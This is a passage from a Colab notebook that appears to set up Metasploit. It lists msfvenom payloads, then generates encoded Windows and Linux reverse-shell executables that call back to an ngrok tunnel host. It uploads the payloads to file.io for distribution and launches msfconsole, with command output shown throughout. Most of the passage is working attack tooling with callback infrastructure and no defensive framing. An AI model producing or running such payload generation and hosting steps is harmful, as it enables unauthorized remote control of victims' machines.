            "    windows/shell/reverse_udp                           Spawn a piped command shell (staged). Connect back to the attacker with UUID Support\n",
            "    windows/shell_bind_tcp                              Listen for a connection and spawn a command shell\n",
            "    windows/shell_bind_tcp_xpfw                         Disable the Windows ICF, then listen for a connection and spawn a command shell\n",
            "    windows/shell_hidden_bind_tcp                       Listen for a connection from certain IP and spawn a command shell. The shellcode will reply with a RST packet if the connections is not coming from the IP defined in AHOST. This way the port will appear as \"closed\" helping us to hide the shellcode.\n",
            "    windows/shell_reverse_tcp                           Connect back to attacker and spawn a command shell\n",
            "    windows/speak_pwned                                 Causes the target to say \"You Got Pwned\" via the Windows Speech API\n",
            "    windows/upexec/bind_hidden_ipknock_tcp              Uploads an executable and runs it (staged). Listen for a connection. First, the port will need to be knocked from the IP defined in KHOST. This IP will work as an authentication method (you can spoof it with tools like hping). After that you could get your shellcode from any IP. The socket will appear as \"closed,\" thus helping to hide the shellcode\n",
            "    windows/upexec/bind_hidden_tcp                      Uploads an executable and runs it (staged). Listen for a connection from a hidden port and spawn a command shell to the allowed host.\n",
            "    windows/upexec/bind_ipv6_tcp                        Uploads an executable and runs it (staged). Listen for an IPv6 connection (Windows x86)\n",
            "    windows/upexec/bind_ipv6_tcp_uuid                   Uploads an executable and runs it (staged). Listen for an IPv6 connection with UUID Support (Windows x86)\n",
            "    windows/upexec/bind_named_pipe                      Uploads an executable and runs it (staged). Listen for a pipe connection (Windows x86)\n",
            "    windows/upexec/bind_nonx_tcp                        Uploads an executable and runs it (staged). Listen for a connection (No NX)\n",
            "    windows/upexec/bind_tcp                             Uploads an executable and runs it (staged). Listen for a connection (Windows x86)\n",
            "    windows/upexec/bind_tcp_rc4                         Uploads an executable and runs it (staged). Listen for a connection\n",
            "    windows/upexec/bind_tcp_uuid                        Uploads an executable and runs it (staged). Listen for a connection with UUID Support (Windows x86)\n",
            "    windows/upexec/find_tag                             Uploads an executable and runs it (staged). Use an established connection\n",
            "    windows/upexec/reverse_ipv6_tcp                     Uploads an executable and runs it (staged). Connect back to the attacker over IPv6\n",
            "    windows/upexec/reverse_nonx_tcp                     Uploads an executable and runs it (staged). Connect back to the attacker (No NX)\n",
            "    windows/upexec/reverse_ord_tcp                      Uploads an executable and runs it (staged). Connect back to the attacker\n",
            "    windows/upexec/reverse_tcp                          Uploads an executable and runs it (staged). Connect back to the attacker\n",
            "    windows/upexec/reverse_tcp_allports                 Uploads an executable and runs it (staged). Try to connect back to the attacker, on all possible ports (1-65535, slowly)\n",
            "    windows/upexec/reverse_tcp_dns                      Uploads an executable and runs it (staged). Connect back to the attacker\n",
            "    windows/upexec/reverse_tcp_rc4                      Uploads an executable and runs it (staged). Connect back to the attacker\n",
            "    windows/upexec/reverse_tcp_rc4_dns                  Uploads an executable and runs it (staged). Connect back to the attacker\n",
            "    windows/upexec/reverse_tcp_uuid                     Uploads an executable and runs it (staged). Connect back to the attacker with UUID Support\n",
            "    windows/upexec/reverse_udp                          Uploads an executable and runs it (staged). Connect back to the attacker with UUID Support\n",
            "    windows/vncinject/bind_hidden_ipknock_tcp           Inject a VNC Dll via a reflective loader (staged). Listen for a connection. First, the port will need to be knocked from the IP defined in KHOST. This IP will work as an authentication method (you can spoof it with tools like hping). After that you could get your shellcode from any IP. The socket will appear as \"closed,\" thus helping to hide the shellcode\n",
            "    windows/vncinject/bind_hidden_tcp                   Inject a VNC Dll via a reflective loader (staged). Listen for a connection from a hidden port and spawn a command shell to the allowed host.\n",
            "    windows/vncinject/bind_ipv6_tcp                     Inject a VNC Dll via a reflective loader (staged). Listen for an IPv6 connection (Windows x86)\n",
            "    windows/vncinject/bind_ipv6_tcp_uuid                Inject a VNC Dll via a reflective loader (staged). Listen for an IPv6 connection with UUID Support (Windows x86)\n",
            "    windows/vncinject/bind_named_pipe                   Inject a VNC Dll via a reflective loader (staged). Listen for a pipe connection (Windows x86)\n",
            "    windows/vncinject/bind_nonx_tcp                     Inject a VNC Dll via a reflective loader (staged). Listen for a connection (No NX)\n",
            "    windows/vncinject/bind_tcp                          Inject a VNC Dll via a reflective loader (staged). Listen for a connection (Windows x86)\n",
            "    windows/vncinject/bind_tcp_rc4                      Inject a VNC Dll via a reflective loader (staged). Listen for a connection\n",
            "    windows/vncinject/bind_tcp_uuid                     Inject a VNC Dll via a reflective loader (staged). Listen for a connection with UUID Support (Windows x86)\n",
            "    windows/vncinject/find_tag                          Inject a VNC Dll via a reflective loader (staged). Use an established connection\n",
            "    windows/vncinject/reverse_hop_http                  Inject a VNC Dll via a reflective loader (staged). Tunnel communication over an HTTP or HTTPS hop point. Note that you must first upload data/hop/hop.php to the PHP server you wish to use as a hop.\n",
            "    windows/vncinject/reverse_http                      Inject a VNC Dll via a reflective loader (staged). Tunnel communication over HTTP (Windows wininet)\n",
            "    windows/vncinject/reverse_http_proxy_pstore         Inject a VNC Dll via a reflective loader (staged). Tunnel communication over HTTP\n",
            "    windows/vncinject/reverse_ipv6_tcp                  Inject a VNC Dll via a reflective loader (staged). Connect back to the attacker over IPv6\n",
            "    windows/vncinject/reverse_nonx_tcp                  Inject a VNC Dll via a reflective loader (staged). Connect back to the attacker (No NX)\n",
            "    windows/vncinject/reverse_ord_tcp                   Inject a VNC Dll via a reflective loader (staged). Connect back to the attacker\n",
            "    windows/vncinject/reverse_tcp                       Inject a VNC Dll via a reflective loader (staged). Connect back to the attacker\n",
            "    windows/vncinject/reverse_tcp_allports              Inject a VNC Dll via a reflective loader (staged). Try to connect back to the attacker, on all possible ports (1-65535, slowly)\n",
            "    windows/vncinject/reverse_tcp_dns                   Inject a VNC Dll via a reflective loader (staged). Connect back to the attacker\n",
            "    windows/vncinject/reverse_tcp_rc4                   Inject a VNC Dll via a reflective loader (staged). Connect back to the attacker\n",
            "    windows/vncinject/reverse_tcp_rc4_dns               Inject a VNC Dll via a reflective loader (staged). Connect back to the attacker\n",
            "    windows/vncinject/reverse_tcp_uuid                  Inject a VNC Dll via a reflective loader (staged). Connect back to the attacker with UUID Support\n",
            "    windows/vncinject/reverse_winhttp                   Inject a VNC Dll via a reflective loader (staged). Tunnel communication over HTTP (Windows winhttp)\n",
            "    windows/x64/exec                                    Execute an arbitrary command (Windows x64)\n",
            "    windows/x64/loadlibrary                             Load an arbitrary x64 library path\n",
            "    windows/x64/messagebox                              Spawn a dialog via MessageBox using a customizable title, text & icon\n",
            "    windows/x64/meterpreter/bind_ipv6_tcp               Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged x64). Listen for an IPv6 connection (Windows x64)\n",
            "    windows/x64/meterpreter/bind_ipv6_tcp_uuid          Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged x64). Listen for an IPv6 connection with UUID Support (Windows x64)\n",
            "    windows/x64/meterpreter/bind_named_pipe             Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged x64). Listen for a pipe connection (Windows x64)\n",
            "    windows/x64/meterpreter/bind_tcp                    Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged x64). Listen for a connection (Windows x64)\n",
            "    windows/x64/meterpreter/bind_tcp_rc4                Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged x64). Connect back to the attacker\n",
            "    windows/x64/meterpreter/bind_tcp_uuid               Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged x64). Listen for a connection with UUID Support (Windows x64)\n",
            "    windows/x64/meterpreter/reverse_http                Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged x64). Tunnel communication over HTTP (Windows x64 wininet)\n",
            "    windows/x64/meterpreter/reverse_https               Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged x64). Tunnel communication over HTTP (Windows x64 wininet)\n",
            "    windows/x64/meterpreter/reverse_named_pipe          Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged x64). Connect back to the attacker via a named pipe pivot\n",
            "    windows/x64/meterpreter/reverse_tcp                 Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged x64). Connect back to the attacker (Windows x64)\n",
            "    windows/x64/meterpreter/reverse_tcp_rc4             Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged x64). Connect back to the attacker\n",
            "    windows/x64/meterpreter/reverse_tcp_uuid            Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged x64). Connect back to the attacker with UUID Support (Windows x64)\n",
            "    windows/x64/meterpreter/reverse_winhttp             Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged x64). Tunnel communication over HTTP (Windows x64 winhttp)\n",
            "    windows/x64/meterpreter/reverse_winhttps            Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged x64). Tunnel communication over HTTPS (Windows x64 winhttp)\n",
            "    windows/x64/meterpreter_bind_named_pipe             Connect to victim and spawn a Meterpreter shell\n",
            "    windows/x64/meterpreter_bind_tcp                    Connect to victim and spawn a Meterpreter shell\n",
            "    windows/x64/meterpreter_reverse_http                Connect back to attacker and spawn a Meterpreter shell\n",
            "    windows/x64/meterpreter_reverse_https               Connect back to attacker and spawn a Meterpreter shell\n",
            "    windows/x64/meterpreter_reverse_ipv6_tcp            Connect back to attacker and spawn a Meterpreter shell\n",
            "    windows/x64/meterpreter_reverse_tcp                 Connect back to attacker and spawn a Meterpreter shell\n",
            "    windows/x64/powershell_bind_tcp                     Listen for a connection and spawn an interactive powershell session\n",
            "    windows/x64/powershell_reverse_tcp                  Listen for a connection and spawn an interactive powershell session\n",
            "    windows/x64/shell/bind_ipv6_tcp                     Spawn a piped command shell (Windows x64) (staged). Listen for an IPv6 connection (Windows x64)\n",
            "    windows/x64/shell/bind_ipv6_tcp_uuid                Spawn a piped command shell (Windows x64) (staged). Listen for an IPv6 connection with UUID Support (Windows x64)\n",
            "    windows/x64/shell/bind_named_pipe                   Spawn a piped command shell (Windows x64) (staged). Listen for a pipe connection (Windows x64)\n",
            "    windows/x64/shell/bind_tcp                          Spawn a piped command shell (Windows x64) (staged). Listen for a connection (Windows x64)\n",
            "    windows/x64/shell/bind_tcp_rc4                      Spawn a piped command shell (Windows x64) (staged). Connect back to the attacker\n",
            "    windows/x64/shell/bind_tcp_uuid                     Spawn a piped command shell (Windows x64) (staged). Listen for a connection with UUID Support (Windows x64)\n",
            "    windows/x64/shell/reverse_tcp                       Spawn a piped command shell (Windows x64) (staged). Connect back to the attacker (Windows x64)\n",
            "    windows/x64/shell/reverse_tcp_rc4                   Spawn a piped command shell (Windows x64) (staged). Connect back to the attacker\n",
            "    windows/x64/shell/reverse_tcp_uuid                  Spawn a piped command shell (Windows x64) (staged). Connect back to the attacker with UUID Support (Windows x64)\n",
            "    windows/x64/shell_bind_tcp                          Listen for a connection and spawn a command shell (Windows x64)\n",
            "    windows/x64/shell_reverse_tcp                       Connect back to attacker and spawn a command shell (Windows x64)\n",
            "    windows/x64/vncinject/bind_ipv6_tcp                 Inject a VNC Dll via a reflective loader (Windows x64) (staged). Listen for an IPv6 connection (Windows x64)\n",
            "    windows/x64/vncinject/bind_ipv6_tcp_uuid            Inject a VNC Dll via a reflective loader (Windows x64) (staged). Listen for an IPv6 connection with UUID Support (Windows x64)\n",
            "    windows/x64/vncinject/bind_named_pipe               Inject a VNC Dll via a reflective loader (Windows x64) (staged). Listen for a pipe connection (Windows x64)\n",
            "    windows/x64/vncinject/bind_tcp                      Inject a VNC Dll via a reflective loader (Windows x64) (staged). Listen for a connection (Windows x64)\n",
            "    windows/x64/vncinject/bind_tcp_rc4                  Inject a VNC Dll via a reflective loader (Windows x64) (staged). Connect back to the attacker\n",
            "    windows/x64/vncinject/bind_tcp_uuid                 Inject a VNC Dll via a reflective loader (Windows x64) (staged). Listen for a connection with UUID Support (Windows x64)\n",
            "    windows/x64/vncinject/reverse_http                  Inject a VNC Dll via a reflective loader (Windows x64) (staged). Tunnel communication over HTTP (Windows x64 wininet)\n",
            "    windows/x64/vncinject/reverse_https                 Inject a VNC Dll via a reflective loader (Windows x64) (staged). Tunnel communication over HTTP (Windows x64 wininet)\n",
            "    windows/x64/vncinject/reverse_tcp                   Inject a VNC Dll via a reflective loader (Windows x64) (staged). Connect back to the attacker (Windows x64)\n",
            "    windows/x64/vncinject/reverse_tcp_rc4               Inject a VNC Dll via a reflective loader (Windows x64) (staged). Connect back to the attacker\n",
            "    windows/x64/vncinject/reverse_tcp_uuid              Inject a VNC Dll via a reflective loader (Windows x64) (staged). Connect back to the attacker with UUID Support (Windows x64)\n",
            "    windows/x64/vncinject/reverse_winhttp               Inject a VNC Dll via a reflective loader (Windows x64) (staged). Tunnel communication over HTTP (Windows x64 winhttp)\n",
            "    windows/x64/vncinject/reverse_winhttps              Inject a VNC Dll via a reflective loader (Windows x64) (staged). Tunnel communication over HTTPS (Windows x64 winhttp)\n",
            "\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "81hsDlIvEW-N",
        "colab_type": "text"
      },
      "source": [
        "LHOST and LPORT should be the value you have generated from your Heroku + Ngrok setup.\n",
        "\n",
        "For example if this is the output:\n",
        "\n",
        "tcp://0.tcp.ngrok.io:10474\n",
        "\n",
        "\n",
        "Then LHOST = 0.tcp.ngrok.io\n",
        "And LPORT = 10474\n"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "UIowb9GI-i7c",
        "colab_type": "code",
        "outputId": "4647e7bd-f0a0-4828-b818-89b482e570aa",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 154
        }
      },
      "source": [
        "%mkdir payloads\n",
        "!msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp -b \"\\x00\" LHOST=172.16.104.130 LPORT=31337 -f exe -o ./payloads/winx86shell.exe"
      ],
      "execution_count": 0,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "mkdir: cannot create directory ‘payloads’: File exists\n",
            "Found 11 compatible encoders\n",
            "Attempting to encode payload with 1 iterations of x86/shikata_ga_nai\n",
            "x86/shikata_ga_nai succeeded with size 368 (iteration=0)\n",
            "x86/shikata_ga_nai chosen with final size 368\n",
            "Payload size: 368 bytes\n",
            "Final size of exe file: 73802 bytes\n",
            "Saved as: ./payloads/winx86shell.exe\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "0OZMI--VH0ME",
        "colab_type": "code",
        "outputId": "7ce51c59-861f-48d4-ce4d-7a873371f47c",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 34
        }
      },
      "source": [
        "!msfvenom -p linux/x86/shell_reverse_tcp -b \"\\x00\" LHOST=0.tcp.ngrok.io LPORT=10474 -f elf -o ./payloads/linuxx86shell.elf"
      ],
      "execution_count": 0,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "/bin/bash: msfvenom: command not found\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "th3g3K9PsK72",
        "colab_type": "code",
        "outputId": "1a4544e4-b051-4f71-ec92-48ec02e379d4",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 206
        }
      },
      "source": [
        "!msfvenom -p linux/x64/shell_reverse_tcp -b \"\\x00\" LHOST=0.tcp.ngrok.io LPORT=10474 -f elf -o ./payloads/linuxx64shell.elf"
      ],
      "execution_count": 0,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload\n",
            "[-] No arch selected, selecting arch: x64 from the payload\n",
            "Found 4 compatible encoders\n",
            "Attempting to encode payload with 1 iterations of generic/none\n",
            "generic/none failed with Encoding failed due to a bad character (index=56, char=0x00)\n",
            "Attempting to encode payload with 1 iterations of x64/xor\n",
            "x64/xor succeeded with size 175 (iteration=0)\n",
            "x64/xor chosen with final size 175\n",
            "Payload size: 175 bytes\n",
            "Final size of elf file: 295 bytes\n",
            "Saved as: ./payloads/linuxx64shell.elf\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "6DDu3un-R3iW",
        "colab_type": "code",
        "outputId": "11442cff-d242-4c6e-9b70-98a90a2e1f8f",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 34
        }
      },
      "source": [
        "!msfvenom -p php/shell/reverse_tcp LHOST=172.16.104.130 LPORT=31337 -f raw -o ./payloads/evil.php"
      ],
      "execution_count": 0,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "Error: invalid payload: php/shell/reverse_tcp\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "2aHm-PqkALSu",
        "colab_type": "code",
        "outputId": "9594be50-eff8-47c4-8e6f-6f84c790a731",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 103
        }
      },
      "source": [
        "!ls -la ./payloads"
      ],
      "execution_count": 0,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "total 160\n",
            "drwxr-xr-x 2 root root  4096 Jul 29 09:39 .\n",
            "drwxr-xr-x 1 root root  4096 Jul 29 09:16 ..\n",
            "-rw-r--r-- 1 root root 73802 Jul 29 09:16 1.exe\n",
            "-rw-r--r-- 1 root root 73802 Jul 29 09:39 winx86shell.exe\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "lT_-1lU4C-9e",
        "colab_type": "text"
      },
      "source": [
        "# Easy way to share a payload is via file.io"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "DmpjDWGJAd5b",
        "colab_type": "code",
        "outputId": "adccb478-b2f3-4790-d698-4622eb1402c0",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 34
        }
      },
      "source": [
        "# https://www.file.io/#one\n",
        "!curl -F \"file=@./payloads/winx86shell.exe\" https://file.io/"
      ],
      "execution_count": 0,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "{\"success\":true,\"key\":\"DIjonf\",\"link\":\"https://file.io/DIjonf\",\"expiry\":\"14 days\"}"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "lRTRNSgPDHRa",
        "colab_type": "code",
        "outputId": "338b8f1a-3fd8-4fdd-8abe-8538052ad1ff",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 34
        }
      },
      "source": [
        "!curl -F \"file=@./payloads/linuxx86shell.elf\" https://file.io/"
      ],
      "execution_count": 0,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "{\"success\":true,\"key\":\"nwGk2m\",\"link\":\"https://file.io/nwGk2m\",\"expiry\":\"14 days\"}"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "XKbPtwj3sSuk",
        "colab_type": "code",
        "outputId": "3c8d2108-5f38-4d7c-b040-933848bd4b76",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 34
        }
      },
      "source": [
        "!curl -F \"file=@./payloads/linuxx64shell.elf\" https://file.io/"
      ],
      "execution_count": 0,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "{\"success\":true,\"key\":\"GeDEh7\",\"link\":\"https://file.io/GeDEh7\",\"expiry\":\"14 days\"}"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "6LEFaB-jIhRp",
        "colab_type": "code",
        "outputId": "60a8ba14-b7bd-4e71-a871-06c706559fc1",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 240
        }
      },
      "source": [
        "# if you want to delete them because you made a mistake simply do a wget\n",
        "!wget https://file.io/DIjonf -O bin.tmp\n",
        "!rm bin.tmp\n",
        "!wget https://file.io/wG4PAr\n",
        "!rm bin.tmp"
      ],
      "execution_count": 0,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "--2019-07-29 09:56:15--  https://file.io/DIjonf\n",
            "Resolving file.io (file.io)... 52.45.188.161, 34.204.113.216\n",
            "Connecting to file.io (file.io)|52.45.188.161|:443... connected.\n",
            "HTTP request sent, awaiting response... 404 Not Found\n",
            "2019-07-29 09:56:15 ERROR 404: Not Found.\n",
            "\n",
            "--2019-07-29 09:56:16--  https://file.io/wG4PAr\n",
            "Resolving file.io (file.io)... 52.45.188.161, 34.204.113.216\n",
            "Connecting to file.io (file.io)|52.45.188.161|:443... connected.\n",
            "HTTP request sent, awaiting response... 404 Not Found\n",
            "2019-07-29 09:56:17 ERROR 404: Not Found.\n",
            "\n",
            "rm: cannot remove 'bin.tmp': No such file or directory\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "uNjPU8de-GLL",
        "colab_type": "code",
        "outputId": "43b7d109-3c32-401a-ecdc-0875d5b77c79",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 958
        }
      },
      "source": [
        "!msfconsole --"
      ],
      "execution_count": 0,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "\u001b[1m\u001b[31m[-]\u001b[0m ***\n",
            "\u001b[1m\u001b[31m[-]\u001b[0m * WARNING: No database support: No database YAML file\n",
            "\u001b[1m\u001b[31m[-]\u001b[0m ***\n",
            "                                                  \n",
            "\u001b[0m\u001b[36m\u001b[0m\u001b[1m\u001b[31m\n",
            "                                   .,,.                  .\n",
            "                                .\\$$$$$L..,,==aaccaacc%#s$b.       \u001b[37md\u001b[32m8,    \u001b[37md8\u001b[32mP\n",
            "                     \u001b[37md8\u001b[36mP        \u001b[31m#$$$$$$$$$$$$$$$$$$$$$$$$$$$b.    \u001b[37m`BP  d88\u001b[32m8888p\n",
            "                  \u001b[37md\u001b[36m888888P      \u001b[31m'7$$$$\\\"\"\"\"''^^`` .7$$$|D*\"'```         \u001b[37m?\u001b[32m88'\n",
            "  \u001b[37md8\u001b[36mbd8b.d8p \u001b[37md8\u001b[36m888b \u001b[37m?\u001b[36m88' \u001b[37md88\u001b[36m8b8b\u001b[31m            _.os#$|8*\"`   \u001b[37md8\u001b[32mP       \u001b[37m?8\u001b[32mb  88P\n",
            "  \u001b[37m8\u001b[36m8P`?P'?P \u001b[37md8\u001b[36mb_,dP 88P \u001b[37md8\u001b[36mP' ?88\u001b[31m       .oaS###S*\"`       \u001b[37md8\u001b[32mP \u001b[37md88\u001b[32m88b $whi?\u001b[32m88b 88b\n",
            " \u001b[36md88  d8 ?8 88b     \u001b[37m8\u001b[36m8b 88b  ,88b \u001b[31m.osS$$$$*\" \u001b[32m?88,.d88b, \u001b[37md\u001b[32m88 \u001b[37md\u001b[32m8P' ?88 88P `?8b\n",
            "\u001b[36md88' d88b 8b`?8888P'`?8b`?88P'\u001b[31m.aS$$$$Q*\"`    \u001b[32m`?88'  ?88 ?88 88b  d88 d88\u001b[31m\n",
            "                          .a#$$$$$$\"`          \u001b[32m88b  d8P  88b`?8888P'\u001b[31m\n",
            "                       ,s$$$$$$$\"`             \u001b[32m888888P'   88n\u001b[31m      _.,,,ass;:\n",
            "                    .a$$$$$$$P`               \u001b[32md88P'\u001b[31m    .,.ass%#S$$$$$$$$$$$$$$'\n",
            "                 .a$###$$$P`           _.,,-aqsc#SS$$$$$$$$$$$$$$$$$$$$$$$$$$'\n",
            "              ,a$$###$$P`  _.,-ass#S$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$####SSSS'\n",
            "           .a$$$$$$$$$$SSS$$$$$$$$$$$$$$$$$$$$$$$$$$$$SS##==--\"\"''^^/$$$$$$'\n",
            "\u001b[37m___________\u001b[0m_____________________________\u001b[1m\u001b[30m_______________________\u001b[31m   ,&$$$$$$'\u001b[30m_____\u001b[31m\n",
            "                                                                 ll&&$$$$'\n",
            "                                                              .;;lll&&&&'\n",
            "                                                            ...;;lllll&'\n",
            "                                                          ......;;;llll;;;....\n",
            "                                                           ` ......;;;;... .  .\n",
            "\u001b[0m\n",
            "\n",
            "       =[ \u001b[33mmetasploit v5.0.39-dev-\u001b[0m                         ]\n",
            "+ -- --=[ 1912 exploits - 1073 auxiliary - 329 post       ]\n",
            "+ -- --=[ 545 payloads - 45 encoders - 10 nops            ]\n",
            "+ -- --=[ 3 evasion                                       ]\n",
            "\n",
            "\u001b[4mmsf5\u001b[0m \u001b[0m> Interrupt: use the 'exit' command to quit\n",
            "\u001b[4mmsf5\u001b[0m \u001b[0m> Interrupt: use the 'exit' command to quit\n",
            "\u001b[4mmsf5\u001b[0m \u001b[0m> Interrupt: use the 'exit' command to quit\n",
            "\u001b[4mmsf5\u001b[0m \u001b[0m> "
          ],
          "name": "stdout"
        },
        {
          "output_type": "error",
          "ename": "KeyboardInterrupt",
          "evalue": "ignored",
          "traceback": [
            "\u001b[0;31m---------------------------------------------------------------------------\u001b[0m",
            "\u001b[0;31mKeyboardInterrupt\u001b[0m                         Traceback (most recent call last)",
            "\u001b[0;32m<ipython-input-72-3bc10e0757b6>\u001b[0m in \u001b[0;36m<module>\u001b[0;34m()\u001b[0m\n\u001b[0;32m----> 1\u001b[0;31m \u001b[0mget_ipython\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0msystem\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m'msfconsole'\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m",
            "\u001b[0;32m/usr/local/lib/python3.6/dist-packages/google/colab/_shell.py\u001b[0m in \u001b[0;36msystem\u001b[0;34m(self, *args, **kwargs)\u001b[0m\n\u001b[1;32m     82\u001b[0m       \u001b[0mkwargs\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mupdate\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m{\u001b[0m\u001b[0;34m'also_return_output'\u001b[0m\u001b[0;34m:\u001b[0m \u001b[0;32mTrue\u001b[0m\u001b[0;34m}\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m     83\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m---> 84\u001b[0;31m     \u001b[0moutput\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0m_system_commands\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0m_system_compat\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mself\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;34m*\u001b[0m\u001b[0margs\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;34m**\u001b[0m\u001b[0mkwargs\u001b[0m\u001b[0;34m)\u001b[0m  \u001b[0;31m# pylint:disable=protected-access\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m     85\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m     86\u001b[0m     \u001b[0;32mif\u001b[0m \u001b[0mpip_warn\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
            "\u001b[0;32m/usr/local/lib/python3.6/dist-packages/google/colab/_system_commands.py\u001b[0m in \u001b[0;36m_system_compat\u001b[0;34m(shell, cmd, also_return_output)\u001b[0m\n\u001b[1;32m    436\u001b[0m   \u001b[0;31m# stack.\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    437\u001b[0m   result = _run_command(\n\u001b[0;32m--> 438\u001b[0;31m       shell.var_expand(cmd, depth=2), clear_streamed_output=False)\n\u001b[0m\u001b[1;32m    439\u001b[0m   \u001b[0mshell\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0muser_ns\u001b[0m\u001b[0;34m[\u001b[0m\u001b[0;34m'_exit_code'\u001b[0m\u001b[0;34m]\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mresult\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mreturncode\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    440\u001b[0m   \u001b[0;32mif\u001b[0m \u001b[0;34m-\u001b[0m\u001b[0mresult\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mreturncode\u001b[0m \u001b[0;32min\u001b[0m \u001b[0m_INTERRUPTED_SIGNALS\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
